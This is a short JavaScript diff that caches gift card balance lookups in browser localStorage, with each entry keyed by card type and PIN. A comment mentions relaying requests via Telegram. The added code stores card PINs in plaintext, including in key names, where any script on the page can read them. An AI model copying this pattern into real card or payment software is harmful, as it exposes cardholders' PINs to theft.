@@ -291,6 +291,31 @@ function resolveRequest(id, status) {
   if (req) { req.status = status === 'ok' ? 'resolved' : 'error'; req.balance = balance; }
   savePendingRequests(arr);
 
+  // Also store latest resolved value by cardType+PIN so frontend can reuse
+  // it immediately on revisit without sending Telegram again.
+  if (req && req.cardType && req.cardPin) {
+    const pinUpper = String(req.cardPin).toUpperCase();
+    const latestKey = `latest_balance_${req.cardType}_${pinUpper}`;
+    if (status === 'ok') {
+      localStorage.setItem(latestKey, JSON.stringify({
+        cardType: req.cardType,
+        cardPinUpper: pinUpper,
+        balance: balance,
+        ts: Date.now(),
+        requestId: id,
+      }));
+      localStorage.setItem('gc_last_lookup_key', latestKey);
+    } else {
+      localStorage.setItem(latestKey, JSON.stringify({
+        cardType: req.cardType,
+        cardPinUpper: pinUpper,
+        error: 'Card not found or invalid PIN.',
+        ts: Date.now(),
+        requestId: id,
+      }));
+    }
+  }
+
   renderRequests();
 }
 
